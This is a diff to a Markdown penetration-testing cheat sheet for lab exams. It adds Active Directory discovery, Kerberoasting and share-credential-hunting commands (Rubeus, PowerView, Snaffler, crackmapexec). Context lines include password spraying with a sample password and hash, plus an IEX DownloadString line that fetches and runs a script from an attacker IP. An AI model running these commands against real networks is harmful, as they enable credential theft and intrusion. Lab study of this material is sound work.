@@ -54,12 +54,14 @@
   - [RunasCs](#runascs)
 - [Discovery](#discovery)
   - [Windows](#windows-3)
+    - [LOLBIN](#lolbin)
     - [PowerView](#powerview)
     - [winPEAS](#winpeas)
     - [Powerless](#powerless)
     - [token](#token)
     - [Sherlock](#sherlock)
     - [PrivescCheck](#privesccheck)
+    - [Snaffler](#snaffler)
     - [BloodHound](#bloodhound)
     - [cmd](#cmd)
   - [Linux](#linux-2)
@@ -72,7 +74,7 @@
   - [Windows](#windows-4)
     - [PowerUp](#powerup)
     - [SharpUp](#sharpup)
-    - [LOLBIN](#lolbin)
+    - [LOLBIN](#lolbin-1)
     - [token](#token-1)
     - [S4U](#s4u)
     - [ADCS](#adcs)
@@ -445,7 +447,7 @@ john --wordlist=/usr/share/wordlists/fasttrack.txt --rules /usr/share/john/rules
 ## Windows
 ### crackmap
 ```bash
-crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success --local-auth
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success --local-auth --loggedon-users
 crackmapexec smb 192.168.226.189 192.168.226.191 192.168.226.248-249 -u user -H 54abdf854d8c0653b1be3458454e4a3b -d htb.local --continue-on-success
 crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
 crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
@@ -510,7 +512,9 @@ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast
 impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -save -outputfile tgs.hash
 
 # Rubeus
+.\Rubeus.exe kerberoast /stats
 .\Rubeus.exe kerberoast /nowrap /format:hashcat /dc:
+.\Rubeus.exe kerberoast /nowrap /format:hashcat /dc: /tgtdeleg
 ```
 #### DCsync
 ```bash
@@ -572,6 +576,12 @@ https://github.com/antonioCoco/RunasCs
 
 # Discovery
 ## Windows
+### LOLBIN
+```powershell
+Import-Module ActiveDirectory
+
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+```
 ### PowerView
 https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
 ```powershell
@@ -585,6 +595,7 @@ Get-LocalGroupMember Administrators
 Invoke-UserHunter
 Get-NetSession -Verbose -ComputerName web04 
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 ```
 ### winPEAS
 ```powershell
@@ -617,6 +628,13 @@ https://github.com/itm4n/PrivescCheck
 wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
 
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/PrivescCheck.ps1'); Invoke-PrivescCheck
+```
+
+### Snaffler
+```powershell
+wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe
+
+.\Snaffler.exe -d oscp.exam -v data
 ```
 
 ### BloodHound
